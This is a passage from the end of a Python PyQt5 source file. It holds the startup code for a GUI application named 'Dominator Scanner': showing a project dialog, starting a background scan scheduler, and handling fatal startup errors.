    app.setApplicationName("Dominator Scanner")

    # Set app icon (optional)
    # app.setWindowIcon(QIcon("icon.png"))

    try:
        window = DominatorGUI()

        # Show project selection dialog
        if not window.show_startup_dialog():
            # User cancelled, exit
            sys.exit(0)

        window.show()

        # Start background scheduler
        window.start_scheduler_background()

        # Check for due scheduled scans after window is shown
        QTimer.singleShot(1000, window.check_scheduled_scans_on_startup)

        sys.exit(app.exec_())

    except Exception as e:
        import traceback
        print(f"\n[FATAL ERROR] Failed to start Dominator GUI:\n{traceback.format_exc()}")
        from PyQt5.QtWidgets import QMessageBox
        QMessageBox.critical(None, "Fatal Error",
            f"Failed to start Dominator:\n\n{str(e)}\n\nCheck console for details.")
        sys.exit(1)


if __name__ == "__main__":
    main()
